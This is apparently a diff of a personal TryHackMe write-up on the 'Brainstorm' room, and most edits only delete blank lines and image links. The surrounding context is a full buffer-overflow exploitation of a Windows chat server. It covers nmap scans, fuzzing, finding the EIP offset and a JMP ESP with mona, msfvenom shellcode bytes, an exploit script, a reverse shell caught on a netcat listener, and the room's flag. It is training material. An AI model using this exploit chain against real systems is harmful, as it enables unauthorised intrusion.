@@ -4,7 +4,6 @@ Reverse engineer a chat program and write a script to exploit a Windows machine.
 
 ![](https://i.imgur.com/rqwhSuo.png)
 
-
 ### Deploy Machine and Scan Network 
 
 Deploy the machine and scan the network to start enumeration!
@@ -71,7 +70,6 @@ HOP RTT       ADDRESS
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 220.73 seconds
 zsh: segmentation fault  sudo nmap -sC -sV -T4 -A -Pn -sS -n -O 10.10.139.173
-
 
 ┌──(kali㉿kali)-[~]
 └─$ sudo nmap -sC -sV -T4 -A -Pn -sS -n -O -p- 10.10.139.173
@@ -147,7 +145,6 @@ zsh: segmentation fault  sudo nmap -sC -sV -T4 -A -Pn -sS -n -O -p- 10.10.139.17
 
 The scan has identified three open ports: 21 (FTP), 3389 (RDP) and 9999 (brainstorm chat).
 
-
 Also using Netcat to interact with the service – it asks for a username and message, the message could be vulnerable to buffer overflow:
 
 ┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
@@ -156,20 +153,15 @@ Welcome to Brainstorm chat (beta)
 Please enter your username (max 20 characters): witty
 Write a message: laala
 
-
 Thu Sep 29 16:01:31 2022
 witty said: laala
 
-
 Write a message:  jaja
-
 
 Thu Sep 29 16:01:36 2022
 witty said: jaja
 
-
 Write a message:  ^C
-
 
 ftp not work in my machine
 
@@ -231,9 +223,7 @@ File may not have transferred correctly.
 ftp> exit
 221 Goodbye.
 
-
 getting the chatserver.exe
-
 
 root@ip-10-10-2-200:~/brainstorm# nc 10.11.81.220 1337 < chatserver.exe
 root@ip-10-10-2-200:~/brainstorm# ls -la
@@ -242,7 +232,6 @@ drwxr-xr-x  2 root root  4096 Sep 30 00:54 .
 drwxr-xr-x 42 root root  4096 Sep 30 00:53 ..
 -rw-r--r--  1 root root 43718 Sep 30 00:55 chatserver.exe
 -rw-r--r--  1 root root 30738 Sep 30 00:54 essfunc.dll
-
 
 ┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
 └─$ nc -nvlp 1337 > essfunc.dll   
@@ -268,7 +257,6 @@ now open a machine buffer overflow prep
 ┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
 └─$ xfreerdp /u:'admin' /p:'password' /v:10.10.99.157 /size:85%
 
-
 Access
 
 Transferring the EXE and DLLfiles to the windows machine, and starting the EXE file:
@@ -285,11 +273,9 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 10.10.99.157 - - [29/Sep/2022 20:20:38] "GET /chatserver.exe HTTP/1.1" 200 -
 10.10.99.157 - - [29/Sep/2022 20:20:51] "GET /essfunc.dll HTTP/1.1" 200 -
 
-
 Creating the initial python fuzzer to find out what amount of bytes will cause the application to crash:
 
 error opening chatserver so maybe is corrupted
-
 
 ┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
 └─$ nc -nvlp 1337 > chatserver.exe                                                               
@@ -326,10 +312,8 @@ drwxr-xr-x 3 kali kali  4096 Sep 29 19:00 ..
 -rw-r--r-- 1 kali kali 30761 Sep 29 21:06 essfunc.dll
 -rw-r--r-- 1 kali kali   547 Sep 29 20:43 fuzzer.py
 
-
 root@ip-10-10-25-204:~# nc 10.11.81.220 1337 < chatserver.exe
 root@ip-10-10-25-204:~# nc 10.11.81.220 1337 < essfunc.dll 
-
 
 ┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
 └─$ msf-pattern_create -l 5000
@@ -344,7 +328,6 @@ open with immunity debbuger and running
 
 EIP 31704330
 
-
                                                                                                                  
 ┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
 └─$ msf-pattern_offset -l 5000 -q 31704330
@@ -353,7 +336,6 @@ EIP 31704330
 found offset 2012
 
 Using Mona to calculate the EIP offset, which is 2012:
-
 
 ┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
 └─$ nano exploit.py
@@ -422,7 +404,6 @@ except:
 └─$ python exploit.py                      
 Sending Payload...
 
-
                                                                                                                  
 ┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
 └─$ nano badchar.py
@@ -440,7 +421,6 @@ print()
 mona
 
 !mona bytearray -b "\x00"
-
 
 ┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
 └─$ cat exploit.py
@@ -481,9 +461,7 @@ except:
     print("Connot Connect")
     sys.exit()
 
-
 ESP: 0190EEC0 follow dump
-
 
 !mona modules
 
@@ -498,7 +476,6 @@ Restarting the application, re-attaching Immunity, and using !mona modules to fi
 follow in dissambler the first then
 
 !mona find -s "\xff\xe4" -m essfunc.dll
-
 
 Choose an address and update your exploit.py script, setting the "retn" variable to the address, written backwards (since the system is little endian). For example if the address is \x01\x02\x03\x04 in Immunity, write it as \x04\x03\x02\x01 in your exploit.
 
@@ -547,7 +524,6 @@ unsigned char buf[] =
 "\xd0\x9d\xed\xc9\xbd\x74\xac\x97\x3d\xa3\xf3\xa1\xbd\x41"
 "\x8c\x55\xdd\x20\x89\x12\x59\xd9\xe3\x0b\x0c\xdd\x50\x2b"
 "\x05";
-
 
 exploit.py
 
@@ -600,11 +576,9 @@ except:
     print("Connot Connect")
     sys.exit()
 
-
 ┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
 └─$ python3 exploit.py
 Sending Payload...
-
 
 ┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
 └─$ nc -nvlp 7777               
@@ -713,14 +687,11 @@ C:\Users\admin\Desktop>
 
 but is the other machine 😂
 
-
-
 now yep :0
 
 ┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
 └─$ python3 exploit.py
 Sending Payload...
-
 
 ┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
 └─$ cat exploit.py
@@ -839,25 +810,11 @@ c:\Users\drake\Desktop>more root.txt
 more root.txt
 5b1001de5a44eca47eee71e7942a8f8a
 
-
 It was a though one!
 
 ```
 
-
-![[Pasted image 20220929202536.png]]
-
-![[Pasted image 20220929211102.png]]
-
-![[Pasted image 20220929212029.png]]
-
-![[Pasted image 20220929213626.png]]
-
-![[Pasted image 20220929214842.png]]
-
-
 ![](https://gitlab.com/dhiksec/tryhackme/-/raw/master/Brainstorm/2020-10-27_23-32.png)
-
 
 How many ports are open?
 scan the network with nmap
@@ -867,15 +824,11 @@ scan the network with nmap
 
 Let's continue with the enumeration!
 
-
-
 What is the name of the exe file you found?
 what protocol is used to transfer files?
 *chatserver.exe*
 
 ### Access 
-
-
 
 After enumeration, you now must have noticed that the service interacting on the strange port is some how related to the files you found! Is there anyway you can exploit that strange service to gain access to the system? 
 
@@ -885,30 +838,17 @@ If you've not done buffer overflows before, check this room out!
 
 https://tryhackme.com/room/bof1
 
-
-
 Read the description.
-
-
-
 
 After testing for overflow, by entering a large number of characters, determine the EIP offset.
 you can use the pattern_offset.rb module in metasploit!
 
-
-
-
 Now you know that you can overflow a buffer and potentially control execution, you need to find a function where ASLR/DEP is not enabled. Why not check the DLL file.
-
 
 Since this would work, you can try generate some shellcode - use msfvenom to generate shellcode for windows. 
 remember that the machine type is x86
 
-
-
 After gaining access, what is the content of the root.txt file?
 *5b1001de5a44eca47eee71e7942a8f8a*
-
-
 
 [[Buffer Overflow Prep]]
